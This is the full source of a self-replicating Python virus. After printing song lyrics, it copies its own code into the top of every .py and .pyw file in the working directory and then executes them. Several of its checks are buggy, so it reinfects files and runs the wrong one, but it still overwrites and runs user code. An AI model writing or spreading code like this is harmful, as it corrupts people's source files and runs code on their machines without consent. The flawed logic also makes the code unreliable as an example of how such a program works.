# VIRUS SAYS HI!
import sys
import glob
import os
print('Never gonna give you up\nNever gonna let you down\nNever gonna run around, and desert you\nNever gonna make you cry\nNever gonna say goodbye\nNever gonna tell a lie, or hurt you\n')
virus_code = []
with open(sys.argv[0], 'r') as f:
    lines = f.readlines()
self_replicating_part = False
for line in lines:
    if line == "# VIRUS SAYS HI!":
        self_replicating_part = True
    if not self_replicating_part:
        virus_code.append(line)
    if line == "# VIRUS SAYS BYE!\n":
        break
python_files = glob.glob('*.py') + glob.glob('*.pyw')
for file in python_files:
    with open(file, 'r') as f:
        file_code = f.readlines()
    infected = False
    for line in file_code:
        if line == "# VIRUS SAYS HI!\n":
            infected = False
            break
    if not infected:
        final_code = []
        final_code.extend(virus_code)
        final_code.extend('\n')
        final_code.extend(file_code)
        with open(file, 'w') as f:
            f.writelines(final_code)
for i in python_files:
  os.system(f'python3 {os.path.abspath(file)} $')
# VIRUS SAYS BYE!
